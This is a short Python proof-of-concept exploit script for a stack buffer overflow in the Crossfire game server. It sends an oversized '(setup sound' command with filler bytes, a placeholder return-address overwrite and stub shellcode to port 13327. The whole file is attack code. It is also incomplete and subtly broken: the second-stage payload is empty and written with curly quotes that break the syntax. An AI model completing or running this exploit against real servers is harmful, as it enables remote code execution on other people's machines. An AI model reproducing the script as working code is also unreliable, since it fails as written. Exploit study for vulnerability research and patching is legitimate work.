#!/usr/bin/python
#crossfire_poc.py POC Exploit for crossfire game in linux 32bit 486 debian kenral
import socket

host = "127.0.0.1"

#Total length of desired buffer
buffer_length = 4379

#buffer to make next writes to EIP
crash = "\x41"*4368

#desired overwrite of EIP
eip = "\x42"*4

stage_one_shellcode = "\x83\xC0\x0C\xFF\xE0"

stage_two_shellcode = “”

#padding after shellcode (calculated by subtracting length of variables present before it in buffer)
padding = "\x90"*(buffer_length - len(crash) - len(stage_one_shellcode) - len(stage_two_shellcode) - len(eip))

buffer = "\x11(setup sound " + crash + eip + stage_one_shellcode + "\x90\x00#"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print "[*]Payload Sent !"
